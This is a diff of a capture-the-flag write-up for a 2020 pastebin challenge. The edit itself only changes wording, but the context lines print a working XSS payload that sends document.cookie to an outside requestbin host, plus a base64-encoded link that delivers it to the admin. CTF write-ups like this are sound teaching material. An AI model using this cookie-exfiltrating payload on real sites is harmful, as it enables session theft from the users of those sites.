@@ -74,7 +74,7 @@ test"><img src=x onerror=alert("22");>
 Now that I know it works locally I modified my payload in this way :  ``` test"><img src=x onerror=window.location.href='https://en96oi0edd3dm.x.pipedream.net/?a='+document.cookie;>``` . I used a requestbin to intercept the admin's cookies.
 
 
-Now the admin needs to visit the link or we can't intercept his cookie, so I encoded all my payload in base 64 and i inserted it in the link with this way :
+The admin needs to visit the link or we can't intercept his cookie, so I encoded all my payload in base 64 and i inserted it in the link with this way :
 
 https://static-pastebin.2020.redpwnc.tf/paste/#dGVzdCI+PGltZyBzcmM9eCBvbmVycm9yPXdpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL2VuOTZvaTBlZGQzZG0ueC5waXBlZHJlYW0ubmV0Lz9hPScrZG9jdW1lbnQuY29va2llOz4=
 
